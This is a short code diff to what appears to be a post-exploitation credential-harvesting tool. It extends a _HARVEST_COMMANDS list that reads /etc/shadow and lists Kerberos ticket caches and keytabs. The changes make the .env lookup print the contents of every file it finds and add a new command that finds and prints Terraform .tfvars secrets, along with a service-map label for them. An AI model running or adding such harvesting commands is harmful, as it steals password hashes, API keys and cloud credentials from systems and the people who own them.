@@ -38,7 +38,8 @@ _HARVEST_COMMANDS = [
     ("shadow_root",  "cat /etc/shadow 2>/dev/null"),
     ("krb5ccache",   "ls /tmp/krb5cc_* 2>/dev/null"),
     ("keytab",       "ls /etc/krb5.keytab 2>/dev/null"),
-    ("env_files",    "find / -maxdepth 5 -name '.env' -readable 2>/dev/null | head -10"),
+    ("env_files",    "find / -maxdepth 5 -name '.env' -readable 2>/dev/null | head -10 | xargs cat 2>/dev/null"),
+    ("terraform",    "find / -maxdepth 6 -name '*.tfvars' -readable 2>/dev/null | head -5 | xargs cat 2>/dev/null"),
 ]
 
 
@@ -172,5 +173,6 @@ def _service_from_label(label: str, pattern_name: str) -> str:
         "pgpass": "postgresql", "my_cnf": "mysql",
         "netrc": "netrc", "shadow_root": "linux",
         "env_files": "env", "env_dump": "env",
+        "terraform": "terraform",
     }
     return service_map.get(label, pattern_name.split("_")[0])
